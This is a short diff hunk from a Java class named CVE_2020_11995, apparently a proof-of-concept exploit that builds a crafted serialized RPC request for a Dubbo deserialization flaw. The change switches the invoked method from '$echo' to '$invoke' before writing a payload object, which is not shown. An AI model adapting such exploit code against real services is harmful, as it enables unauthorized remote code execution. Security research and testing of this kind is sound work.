@@ -37,10 +37,10 @@ public class CVE_2020_11995 {
         out.writeUTF("2.0.2");
         out.writeUTF("org.example.api.DemoService");
         out.writeUTF("0.0.0");
-//        out.writeUTF("$invoke");
-//        out.writeUTF("Ljava/util/Map;");
-        out.writeUTF("$echo");
-        out.writeUTF("Ljava/lang/Object;");
+        out.writeUTF("$invoke");
+        out.writeUTF("Ljava/util/Map;");
+//        out.writeUTF("$echo");
+//        out.writeUTF("Ljava/lang/Object;");
         out.writeObject(o);
         out.writeObject(new HashMap());
 
